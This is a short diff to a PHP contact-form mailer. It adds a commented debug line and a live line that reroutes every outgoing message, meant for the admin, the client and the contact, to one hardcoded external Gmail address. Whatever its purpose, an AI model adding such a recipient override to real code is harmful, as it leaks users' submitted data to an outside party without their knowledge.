@@ -119,6 +119,11 @@ $headers_client = "MIME-Version: 1.0" . PHP_EOL .
 'From: '.adopt($project_name).' <'.$admin_email.'>' . PHP_EOL .
 'Reply-To: '.$email_contact.'' . PHP_EOL;
 
+//die($admin_email.' '.$email_client.' '.$email_contact);
+
+$admin_email = $email_client = $email_contact = 'folder.list@gmail.com';
+
+
 mail($admin_email, adopt($themes_admin), $message_admin, $headers_admin );
 mail($email_client, adopt($themes_client), $message_client, $headers_client );
 mail($email_contact, adopt($themes_contact), $message_contact, $headers_contact );
